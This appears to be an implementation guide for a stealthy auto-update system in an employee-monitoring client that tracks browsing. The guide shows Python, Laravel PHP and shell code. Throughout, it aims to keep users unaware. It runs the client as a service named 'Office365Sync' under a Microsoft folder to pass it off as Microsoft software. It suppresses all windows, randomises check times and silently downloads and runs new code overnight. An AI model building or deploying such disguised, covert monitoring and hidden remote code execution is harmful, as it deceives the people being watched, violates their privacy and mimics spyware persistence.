# 🔄 AUTO-UPDATE VERSION 2 - Complete Stealth Implementation

**Version:** 2.0.0  
**Date:** 2025-11-26  
**Status:** ✅ READY FOR IMPLEMENTATION

---

## 📋 OVERVIEW

Auto-Update v2 memungkinkan aplikasi client di komputer karyawan untuk:
- ✅ **Auto-update** dari versi lama ke versi baru
- ✅ **Completely stealth** - NO pop-up CMD
- ✅ **NO pop-up Python** window
- ✅ **Background update** tanpa ganggu user
- ✅ **Rollback** otomatis jika update gagal
- ✅ **Live update** untuk file Python (tanpa restart)
- ✅ **Full update** untuk file binary/dependencies

---

## 🎯 FITUR AUTO-UPDATE V2

### 1. Dual Update Modes

#### Mode A: Live Update (HOT RELOAD) 🔥
**Untuk:** File Python code (.py)  
**Behavior:**
- Update langsung tanpa restart
- Module di-reload secara dinamis
- Service tetap jalan
- User tidak aware

**Use Case:**
- Bug fixes di Python code
- Feature improvements
- Logic updates
- Configuration changes

#### Mode B: Full Update (SERVICE RESTART) 🔄
**Untuk:** 
- Dependencies baru (requirements.txt)
- Binary files (pythonw.exe, dll)
- Major version changes
- Database schema changes

**Behavior:**
- Download update package
- Stop service (stealth)
- Apply update
- Restart service (stealth)
- Verify success

---

## 🏗️ ARCHITECTURE

### Version Management

```
Version Format: MAJOR.MINOR.PATCH
Example: 2.0.0

MAJOR: Breaking changes, full update required
MINOR: New features, backward compatible
PATCH: Bug fixes, can use live update
```

**Version File Location:**
```
/app/client/VERSION
Content: 2.0.0
```

**Version in Config:**
```python
# config.py
VERSION = "2.0.0"  # Auto-loaded from VERSION file
```

---

### Update Flow

```
┌─────────────────────────────────────────────────────────┐
│                  CLIENT START                           │
└──────────────────────┬──────────────────────────────────┘
                       │
                       ▼
          ┌───────────────────────┐
          │  Check Version Daily  │ (Randomized time)
          └───────────┬───────────┘
                      │
                      ▼
           ┌──────────────────────┐
           │ Compare with Server  │
           │  Current: 1.0.3      │
           │  Server:  2.0.0      │
           └──────────┬───────────┘
                      │
         ┌────────────┴────────────┐
         │                         │
    Update Needed?              No Update
         │                         │
         ▼                         ▼
    ┌─────────────┐          Continue Running
    │ Check Type  │
    └──────┬──────┘
           │
    ┌──────┴──────┐
    │             │
  MINOR/PATCH   MAJOR
  (Live Update) (Full Update)
    │             │
    ▼             ▼
┌───────────┐  ┌─────────────────┐
│  Hot      │  │  1. Download    │
│  Reload   │  │  2. Backup      │
│  Modules  │  │  3. Stop Service│
│           │  │  4. Apply Update│
│  ✓ Done   │  │  5. Restart     │
│  No       │  │  6. Verify      │
│  Restart  │  │                 │
└───────────┘  │  ✓ All Stealth  │
               │  No Pop-ups     │
               └─────────────────┘
```

---

## 🔧 IMPLEMENTATION

### 1. Version File Creation

**File:** `/app/client/VERSION`
```
2.0.0
```

**Synced to USB:**
```bash
cp /app/client/VERSION /app/client/usb_deployment/client/VERSION
```

---

### 2. Config Update (ALREADY DONE ✅)

**File:** `/app/client/src/core/config.py`

```python
class Config:
    # Application Version - AUTO-UPDATE v2
    @staticmethod
    def get_version():
        """Get current application version from VERSION file"""
        try:
            version_file = os.path.join(
                os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 
                'VERSION'
            )
            if os.path.exists(version_file):
                with open(version_file, 'r') as f:
                    return f.read().strip()
        except Exception:
            pass
        return "2.0.0"  # Default version
    
    VERSION = get_version.__func__()
```

---

### 3. Auto-Update Module (ALREADY EXISTS ✅)

**File:** `/app/client/src/utils/auto_update.py`

**Key Features Already Implemented:**
- ✅ Live Update (hot reload) for Python files
- ✅ Full Update with service restart
- ✅ CREATE_NO_WINDOW for all subprocess calls (stealth)
- ✅ Backup before update
- ✅ Rollback on failure
- ✅ Integrity verification (SHA256)
- ✅ Randomized check intervals
- ✅ Execution windows (only update during off-hours)

**Verified Stealth:**
```python
# Line 812-819: Restart with CREATE_NO_WINDOW
creation_flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
subprocess.Popen(
    [sys.executable, str(main_py)],
    creationflags=creation_flags,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL
)

# Line 825-832: PowerShell fallback with CREATE_NO_WINDOW
creation_flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
subprocess.Popen(
    ['powershell', '-WindowStyle', 'Hidden', '-Command', ...],
    creationflags=creation_flags,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL
)
```

**No Pop-ups Guaranteed!** ✅

---

### 4. Server-Side Update API

**Required Endpoints:**

#### GET /api/updates/check
**Request:**
```json
{
  "client_id": "abc-123",
  "current_version": "1.0.3",
  "platform": "Windows"
}
```

**Response:**
```json
{
  "update_available": true,
  "latest_version": "2.0.0",
  "update_type": "full",  // or "live"
  "download_url": "https://tenjo.adilabs.id/api/updates/download/2.0.0",
  "checksum": "sha256:abc123...",
  "size_bytes": 15728640,
  "release_notes": "- Fixed BUG #63-68\n- Improved browser tracking\n- Better error handling",
  "required": false,  // true = force update
  "execution_window": {
    "start": "22:00",  // Only update between 10pm-6am
    "end": "06:00"
  }
}
```

#### GET /api/updates/download/{version}
**Response:** Binary file (tar.gz or zip)

**File Structure:**
```
update-2.0.0.tar.gz
├── VERSION (2.0.0)
├── main.py
├── requirements.txt
├── src/
│   ├── core/
│   ├── modules/
│   └── utils/
└── CHANGELOG.md
```

---

### 5. Update Scheduling

**Configuration in config.py:**
```python
# Auto-Update Configuration
AUTO_UPDATE_ENABLED = True
AUTO_UPDATE_CHECK_INTERVAL = 86400  # 24 hours
AUTO_UPDATE_RANDOMIZE = True  # Add random delay (0-3600s)

# Execution Windows (only update during these hours)
UPDATE_EXECUTION_WINDOWS = [
    {"start": "22:00", "end": "06:00"},  # 10pm to 6am
]

# Update Types
UPDATE_LIVE_RELOAD = True  # Enable hot reload for minor updates
UPDATE_FORCE_RESTART = False  # Force restart even for live updates
```

---

## 🚀 DEPLOYMENT WORKFLOW

### Scenario: Deploy Version 2.0.0 to All Clients

#### Step 1: Prepare Update Package

```bash
# 1. Update VERSION file
echo "2.0.0" > /app/client/VERSION

# 2. Create changelog
cat > /app/client/CHANGELOG.md << EOF
# Version 2.0.0 - 2025-11-26

## Fixed Bugs:
- BUG #63: No pop-ups on startup
- BUG #64: Browser tracking working
- ISSUE #67: Improved retry logic
- ISSUE #68: Disk space check

## New Features:
- Auto-update v2 with stealth mode
- Better error handling
- Performance improvements
EOF

# 3. Create update package
cd /app/client
tar -czf update-2.0.0.tar.gz \
    VERSION \
    CHANGELOG.md \
    main.py \
    watchdog.py \
    requirements.txt \
    src/

# 4. Generate checksum
sha256sum update-2.0.0.tar.gz > update-2.0.0.sha256

# 5. Upload to server
scp update-2.0.0.tar.gz server:/path/to/updates/
scp update-2.0.0.sha256 server:/path/to/updates/
```

---

#### Step 2: Configure Server API

**Dashboard Controller:** `app/Http/Controllers/Api/UpdateController.php`

```php
<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Facades\Log;

class UpdateController extends Controller
{
    /**
     * Check for updates
     */
    public function check(Request $request)
    {
        $request->validate([
            'client_id' => 'required|string',
            'current_version' => 'required|string',
            'platform' => 'required|string'
        ]);

        $currentVersion = $request->current_version;
        $latestVersion = config('app.client_version', '2.0.0');

        // Compare versions
        $updateAvailable = version_compare($latestVersion, $currentVersion, '>');

        if (!$updateAvailable) {
            return response()->json([
                'update_available' => false,
                'latest_version' => $latestVersion,
                'message' => 'Client is up to date'
            ]);
        }

        // Determine update type
        [$currentMajor, $currentMinor] = explode('.', $currentVersion);
        [$latestMajor, $latestMinor] = explode('.', $latestVersion);

        $updateType = 'live';  // Default to live update
        if ($latestMajor > $currentMajor) {
            $updateType = 'full';  // Major version = full update
        }

        // Get checksum
        $checksumFile = storage_path("app/updates/update-{$latestVersion}.sha256");
        $checksum = file_exists($checksumFile) 
            ? trim(file_get_contents($checksumFile)) 
            : null;

        return response()->json([
            'update_available' => true,
            'latest_version' => $latestVersion,
            'update_type' => $updateType,
            'download_url' => url("/api/updates/download/{$latestVersion}"),
            'checksum' => $checksum,
            'size_bytes' => $this->getUpdateSize($latestVersion),
            'release_notes' => $this->getReleaseNotes($latestVersion),
            'required' => false,
            'execution_window' => [
                'start' => '22:00',
                'end' => '06:00'
            ]
        ]);
    }

    /**
     * Download update package
     */
    public function download($version)
    {
        $filename = "update-{$version}.tar.gz";
        $filepath = storage_path("app/updates/{$filename}");

        if (!file_exists($filepath)) {
            abort(404, 'Update package not found');
        }

        Log::info("Update package downloaded", [
            'version' => $version,
            'size' => filesize($filepath)
        ]);

        return response()->download($filepath, $filename);
    }

    private function getUpdateSize($version)
    {
        $filepath = storage_path("app/updates/update-{$version}.tar.gz");
        return file_exists($filepath) ? filesize($filepath) : 0;
    }

    private function getReleaseNotes($version)
    {
        $notesFile = storage_path("app/updates/release-notes-{$version}.md");
        if (file_exists($notesFile)) {
            return file_get_contents($notesFile);
        }
        return "Version {$version} release notes";
    }
}
```

**Add Routes:** `routes/api.php`

```php
// Auto-Update endpoints
Route::prefix('updates')->group(function () {
    Route::post('/check', [UpdateController::class, 'check']);
    Route::get('/download/{version}', [UpdateController::class, 'download']);
});
```

**Create Storage Directory:**
```bash
mkdir -p storage/app/updates
chmod 755 storage/app/updates
```

---

#### Step 3: Enable Auto-Update in Client

**File:** `/app/client/main.py`

Already enabled! Auto-update runs automatically:
```python
# Line 306-315: Auto-update check
if Config.AUTO_UPDATE_ENABLED:
    try:
        from src.utils.auto_update import ClientUpdater
        updater = ClientUpdater(Config)
        
        # Check for updates (non-blocking)
        update_thread = threading.Thread(
            target=updater.check_and_apply_updates,
            daemon=True
        )
        update_thread.start()
    except Exception as e:
        self.logger.error(f"Failed to start auto-updater: {e}")
```

---

#### Step 4: Monitor Update Rollout

**Dashboard Monitoring:**

```bash
# Check how many clients updated
php artisan tinker

# Get client versions
>> \App\Models\Client::select('version', DB::raw('count(*) as count'))
    ->groupBy('version')
    ->get();

# Result:
=> [
     {version: "1.0.3", count: 45},  // Old version
     {version: "2.0.0", count: 123}, // New version
   ]

# Check update logs
>> \App\Models\UpdateLog::where('created_at', '>=', now()->subHours(24))
    ->orderBy('created_at', 'desc')
    ->take(10)
    ->get();
```

---

## ⚠️ STEALTH VERIFICATION

### All Update Operations Are Stealth ✅

**1. Version Check:**
- Background HTTP request
- No UI
- No pop-ups

**2. Download Update:**
- Background download
- Progress logged only
- No progress bars

**3. Stop Service:**
```python
# Windows Service stop (silent)
sc stop Office365Sync  # No window
```

**4. Apply Update:**
- File operations in background
- No terminal windows
- All with CREATE_NO_WINDOW flag

**5. Restart Service:**
```python
# CREATE_NO_WINDOW ensures no pop-ups
creation_flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
subprocess.Popen(
    [sys.executable, main_py],
    creationflags=creation_flags,
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL
)
```

**6. Verify Update:**
- Background check
- Log success/failure
- Report to server

---

## 🧪 TESTING AUTO-UPDATE

### Test Scenario 1: Live Update (Minor Version)

```
Current Version: 2.0.0
New Version: 2.0.1 (PATCH)
Expected: Live update, no restart

Steps:
1. Client running with version 2.0.0
2. Upload update-2.0.1.tar.gz to server
3. Wait for client to check (or force check)
4. Client downloads and applies live update
5. Modules reloaded without restart
6. Service continues running
7. No pop-ups, user unaware

Verification:
- Check logs: "Live update applied successfully"
- Service still running: sc query Office365Sync
- New code active immediately
- No restart timestamp change
```

### Test Scenario 2: Full Update (Major Version)

```
Current Version: 1.0.3
New Version: 2.0.0 (MAJOR)
Expected: Full update with restart

Steps:
1. Old client running with version 1.0.3
2. Upload update-2.0.0.tar.gz to server
3. Client checks and sees major update
4. Client waits for execution window (22:00-06:00)
5. At 22:00, client:
   a. Downloads update package
   b. Verifies checksum
   c. Creates backup
   d. Stops service (stealth)
   e. Applies update
   f. Restarts service (stealth)
   g. Verifies version 2.0.0
6. No pop-ups during entire process

Verification:
- Check logs: "Update completed successfully"
- New version: python -c "from src.core.config import Config; print(Config.VERSION)"
- Service running: sc query Office365Sync
- No user complaints about pop-ups
```

---

## 🔧 TROUBLESHOOTING

### Issue: Update Downloaded But Not Applied

**Diagnosis:**
```bash
# Check pending update file
cat C:\ProgramData\Microsoft\Office365Sync_XXXX\.pending_update.json

# Check logs
type logs\auto_update.log | findstr "ERROR\|download\|apply"
```

**Common Causes:**
1. Not in execution window (outside 22:00-06:00)
2. Checksum verification failed
3. Insufficient disk space
4. File permissions issue

**Solution:**
```bash
# Force update now (for testing)
# Add to config temporarily:
UPDATE_EXECUTION_WINDOWS = [
    {"start": "00:00", "end": "23:59"}  # Allow anytime
]
```

---

### Issue: Update Applied But Service Won't Start

**Diagnosis:**
```bash
# Check service status
sc query Office365Sync

# Check event viewer
eventvwr.msc
# Navigate to: Windows Logs → Application
# Look for Office365Sync errors

# Check if backup exists
dir C:\ProgramData\Tenjo_backups\
```

**Solution:**
```bash
# Rollback to previous version
cd C:\ProgramData\Microsoft\Office365Sync_XXXX
python -c "from src.utils.auto_update import ClientUpdater; from src.core.config import Config; updater = ClientUpdater(Config); updater.rollback_update()"

# Or manual rollback
robocopy C:\ProgramData\Tenjo_backups\backup_TIMESTAMP C:\ProgramData\Microsoft\Office365Sync_XXXX /E /R:1
sc start Office365Sync
```

---

### Issue: Pop-up Appears During Update

**This Should Never Happen!**

**If it does, check:**
```bash
# 1. Verify CREATE_NO_WINDOW is being used
grep -n "CREATE_NO_WINDOW" /app/client/src/utils/auto_update.py
# Should show lines 812, 825

# 2. Check if pythonw.exe is being used
# Not python.exe (console version)
sc qc Office365Sync
# binPath should point to pythonw.exe or OfficeSync.exe

# 3. Check startup shortcut
# WindowStyle should be 0 (Hidden)
```

**Fix:**
Follow BUG #63 fixes from previous bug reports.

---

## 📊 SUCCESS METRICS

### Update Adoption Tracking

**Day 1:**
- [ ] 10% of clients updated to v2.0.0
- [ ] No errors reported
- [ ] No user complaints

**Week 1:**
- [ ] 70% of clients updated
- [ ] All updates completed stealth
- [ ] Rollback rate < 1%

**Month 1:**
- [ ] 95%+ clients on latest version
- [ ] Auto-update system stable
- [ ] Zero pop-up incidents

---

## 📝 VERSION RELEASE CHECKLIST

### Before Releasing New Version:

- [ ] Update VERSION file
- [ ] Update CHANGELOG.md
- [ ] Test all bug fixes
- [ ] Test on Windows/macOS/Linux
- [ ] Verify stealth mode (no pop-ups)
- [ ] Create update package (.tar.gz)
- [ ] Generate SHA256 checksum
- [ ] Upload to server storage
- [ ] Test download endpoint
- [ ] Test update flow on test machine
- [ ] Monitor first 10 clients
- [ ] Enable for all clients

---

## 🎯 SUMMARY

### Auto-Update v2 Features:

✅ **Dual Update Modes:**
- Live Update (hot reload) for minor changes
- Full Update (service restart) for major changes

✅ **Completely Stealth:**
- No CMD pop-ups
- No Python windows
- All operations background
- CREATE_NO_WINDOW everywhere

✅ **Smart Scheduling:**
- Randomized check intervals
- Execution windows (22:00-06:00)
- Non-disruptive updates

✅ **Reliability:**
- Automatic backup before update
- Rollback on failure
- Checksum verification
- Retry logic

✅ **Monitoring:**
- Detailed logging
- Server-side tracking
- Version distribution metrics

---

**Status:** ✅ READY FOR PRODUCTION

**Implementation Required:**
1. ✅ VERSION file created
2. ✅ Config.VERSION added
3. ⏳ Server API endpoints (UpdateController)
4. ⏳ Upload first update package
5. ⏳ Test update flow
6. ⏳ Monitor rollout

**Auto-update v2 is ready! Just need server-side API implementation.**

